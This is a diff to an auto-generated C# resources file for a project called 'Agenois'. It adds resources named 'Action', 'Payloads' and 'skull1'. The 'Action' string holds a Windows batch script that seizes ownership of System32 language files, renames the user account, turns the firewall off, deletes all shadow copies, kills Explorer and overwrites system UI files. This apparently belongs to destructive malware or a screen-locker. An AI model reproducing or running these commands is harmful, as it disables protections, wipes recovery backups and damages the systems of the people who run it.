@@ -59,5 +59,44 @@ namespace Agenois.Properties {
                 resourceCulture = value;
             }
         }
+        
+        /// <summary>
+        ///   Looks up a localized string similar to @echo on
+        ///takeown /f &quot;C:\Windows\System32\en-US&quot; /r /d y
+        ///icacls &quot;C:\Windows\System32\en-US&quot; /granted %username%:F /T /C
+        ///wmic useraccount where name=&apos;%username%&apos; set FullName=&apos;Username&apos;
+        ///wmic useraccount where name=&apos;%username%&apos; rename &apos;Username&apos;
+        ///NetSh Advfirewall set allprofiles state off
+        ///vssadmin delete shadows /all /Quiet
+        ///taskkill /f /im explorer.exe
+        ///TIMEOUT 1
+        ///copy &quot;C:\Windows\Defender\authui.dll.mui&quot; &quot;C:\Windows\System32\en-US\authui.dll.mui&quot; /Y
+        ///copy &quot;C:\Windows\Defender\explorer.exe.mui&quot; &quot;C:\Wind [rest of string was truncated]&quot;;.
+        /// </summary>
+        internal static string Action {
+            get {
+                return ResourceManager.GetString("Action", resourceCulture);
+            }
+        }
+        
+        /// <summary>
+        ///   Looks up a localized resource of type System.Byte[].
+        /// </summary>
+        internal static byte[] Payloads {
+            get {
+                object obj = ResourceManager.GetObject("Payloads", resourceCulture);
+                return ((byte[])(obj));
+            }
+        }
+        
+        /// <summary>
+        ///   Looks up a localized resource of type System.Byte[].
+        /// </summary>
+        internal static byte[] skull1 {
+            get {
+                object obj = ResourceManager.GetObject("skull1", resourceCulture);
+                return ((byte[])(obj));
+            }
+        }
     }
 }
